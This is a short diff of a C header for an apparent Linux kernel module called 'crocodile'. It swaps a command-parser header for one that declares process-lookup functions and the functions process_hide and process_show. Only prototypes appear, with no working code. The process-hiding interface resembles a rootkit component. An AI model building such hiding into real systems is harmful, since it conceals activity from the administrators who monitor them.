@@ -16,12 +16,23 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_CTRL_PARSER_STR_CMD_H_
-#define _CROCODILE_LKM_CTRL_PARSER_STR_CMD_H_
+#ifndef _CROCODILE_LKM_CTRL_PID_UTILS_H_
+#define _CROCODILE_LKM_CTRL_PID_UTILS_H_
 
 #include <linux/types.h>
 
-int parse_str_cmd(char* p_cmd_str, size_t count, unsigned int* p_cmd, unsigned long* p_arg);
+/* Forward declaration of the system structure. */
+struct pid;
 
-#endif /* _CROCODILE_LKM_CTRL_PARSER_STR_CMD_H_ */
+/* Forward declaration of the system structure. */
+struct task_struct;
+
+struct pid* find_pid(pid_t nr);
+
+struct task_struct* find_process(pid_t pid);
+
+long process_hide(pid_t pid);
+long process_show(pid_t pid);
+
+#endif /* _CROCODILE_LKM_CTRL_PID_UTILS_H_ */
 
